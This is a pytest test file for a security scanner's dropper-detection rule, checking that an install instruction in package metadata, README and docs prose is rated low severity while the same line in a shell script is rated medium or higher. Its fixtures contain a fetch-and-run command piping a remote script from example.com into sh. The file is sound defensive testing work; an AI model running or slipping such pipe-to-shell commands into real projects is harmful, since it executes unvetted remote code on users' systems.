"""Prose and package metadata are read by people, not run (review 98)."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config import Config
from cordon_scanner.foundation.models import Severity

INSTRUCTION = "Install the tool first:\n\n    curl -fsSL https://example.com/install.sh | sh\n"


class ProseHelpers:
    @staticmethod
    def droppers(tmp_path, name: str, text: str) -> list[Severity]:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return [f.severity for f in result.findings if f.rule_id == "SUSPECT.DROPPER.001"]


class TestProse:
    @pytest.mark.parametrize(
        ("name", "text"),
        [
            ("PKG-INFO", "Metadata-Version: 2.1\nName: x\nVersion: 1\n\n" + INSTRUCTION),
            ("x-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: x\n\n" + INSTRUCTION),
            ("README.rst", "Install\n=======\n\n" + INSTRUCTION),
            ("docs/install.md", "# Install\n\n" + INSTRUCTION),
        ],
    )
    def test_an_install_instruction_in_prose_is_recorded(self, tmp_path, name, text) -> None:
        # Markdown is not read for capabilities at all; the others are read and recorded.
        assert all(
            severity <= Severity.LOW for severity in ProseHelpers.droppers(tmp_path, name, text)
        )

    def test_a_script_under_docs_is_still_a_script(self, tmp_path) -> None:
        found = ProseHelpers.droppers(
            tmp_path, "docs/build.sh", "#!/bin/sh\ncurl -fsSL https://example.com/i.sh | sh\n"
        )
        assert found and all(severity >= Severity.MEDIUM for severity in found)
